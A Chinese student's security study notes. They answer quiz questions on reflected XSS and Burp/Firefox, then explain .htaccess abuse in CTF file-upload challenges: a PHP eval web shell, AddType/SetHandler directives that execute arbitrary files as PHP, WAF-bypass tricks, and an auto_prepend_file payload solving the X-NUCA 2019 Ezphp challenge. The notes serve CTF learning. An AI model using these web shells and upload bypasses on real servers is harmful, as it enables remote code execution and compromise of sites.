# nep第三周学习笔记

## 观看视频

1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）

**burp proxy和Firefox**

**可以用来监控http和http流量**

**firefox可以简单设置代理，查看想要的流量，以及查看cookies。**

2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）

**我们不能像防御者那样思考，而是要像攻击者那样思考，有哪些地方是可以攻击这样才可以进行更好的防御。攻击者会比防御者更有优势，因为防御者不可能每一个地方都想到，而攻击者只需要找出一个点就行了，但是防御者可以对高危区进行加固，这样可以减少被攻击的危险。打ctf也是一样的道理，我们不是为了攻击，而是更好的知道攻击者是怎么攻击的，找出其中的漏洞来进行修复。去护网的web师傅们也是这样，他们会各种攻击方式，但是他们从不会去主动攻击、破坏，而是在有需要的时候找出会被攻击的点来进行修补，不让别人有机可乘。**



3.那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）

**这一部分是属于服务端的**

```php+HTML
<?php
if(isset($_GET[ ' name ' ])){
echo "<h1>Hello {$_GET['name']} !</h1>";
}
?>
```

**这一部分是属于客户端的**

```php+HTML
<form method="GET">
Enter your name: <input type="input" name="name"><br>
<input type=" submit">
```

客户端是通过传递什么参数来控制服务端代码的？（1分）

**客户端通过GET请求传递一个name的参数来对服务端进行控制**

客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）

**会造成xss漏洞，是反射型的xss漏洞。反射型的xss漏洞会将用户嵌入的脚本当成数据发送给服务端，然后服务端又会执行脚本，接着将数据返回到客户端。**

4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）

**可以利用xss漏洞远程窃取cookies，远程窃取指定页面快照。**

**防御措施：**

- **使用转义，将html相关的字符转义htmlspecialchars()**
- **过滤**
- **使用预处理对注入进行防护**

## .htaccess的学习

这两天做羊城杯的一道题遇到了需要利用`.htaccess`文件，于是就来学习一下`.htaccess`文件的一个用法

`.htaccess`文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

启用`.htaccess`，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。

在CTF当中，我们经常会在文件上传漏洞当中使用到`.htaccess`文件

### 任意文件解析

#### AddType

例如

我上传的是一个aaa后缀的文件

```php
<script language="php">@eval($_POST['cmd']);</script>
```

然后可以利用`.htaccess`对aaa文件进行解析

```
AddType application/x-httpd-php .aaa
```

这样就可以执行恶意指令了

![image-20210415131947887](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415131947887.png)

#### AddHandler

```
AddHandler php5-script .txt
```

```
AddHandler php7-script .txt
```

这个可以将txt文件当成php文件来解析

#### SetHandler

```
SetHandler application/x-httpd-php
```

这样写可以将所有文件都当成php文件来执行

### .htaccess的绕过

- `\`换行绕过脏字符或绕WAF

- 利用XMP图片解析头(`#`刚好是注释符)

  ```
  #define 4c11f3876d494218ff327e3ca6ac824f_width xxx(大小)
  #define 4c11f3876d494218ff327e3ca6ac824f_height xxx(大小)
  ```

这里的原理其实是伪造为xbm文件，xbm文件是一种图片格式的文件。

![image-20210415134916699](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415134916699.png)

不过还需要在上传的文件当中加上一个gif的文件头GIF89a

### 进行文件包含

- `auto_prepend_file` 在页面顶部加载文件
- `auto_append_file` 在页面底部加载文件

例如写入这个

```
php_value auto_prepend_file 1.php
```

那么就会将`1.php`这个文件包含到所有文件当中

![image-20210415141120350](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415141120350.png)

![image-20210415141147493](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415141147493.png)

![image-20210415141159145](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415141159145.png)

我们还可以利用php的伪协议来进行编码绕过

```
AddType application/x-httpd-php .jpg
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.jpg"
```

## 例题：X-NUCA'2019—Ezphp

题目：

```php
 <?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?> 
```

打开之后还出现了两个警告

```
Warning: include_once(fl3g.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 10

Warning: include_once(): Failed opening 'fl3g.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 10
```

这里有个`unlink`函数

![image-20210415141800526](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415141800526.png)

查询官方文档得知是用来删除同目录文件的

下面有个`file_put_contents`,如果按照普通题目的话就可以使用`file://`协议去做，但是这道题把`file://`协议给过滤掉了

如果利用写shell的方法也不行，因为会清除文件

这时候我们就可以用`.htaccess`文件包含的方法来做

先是把`.htaccess`包含进index.php里面

因为file被过滤掉了，所以要用反斜杠进行换行

```
php_value auto_prepend_fi\
le .htaccess
```

然后把代码写进去

```
php_value auto_prepend_fi\
le .htaccess
<?php phpinfo();?>
```

会发现这样写没反应，直接报500错误

![image-20210415231115628](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210415231115628.png)

这是因为输入的内容被自动加入了`\nJust one chance`，就造成了语法错误，就报错了

![image-20210417203923003](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210417203923003.png)

直接把后面的内容用`#`注释掉就可以了，然后再加个\把后面转义掉

```
php_value auto_prepend_fi\
le .htaccess
#<?php phpinfo();?>\
```

这样就可以写进去了

![image-20210417204627535](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210417204627535.png)

![image-20210417204640636](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210417204640636.png)

![image-20210417204701060](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210417204701060.png)

然后把phpinfo()换成个小马就可以了

![image-20210417204953246](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210417204953246.png)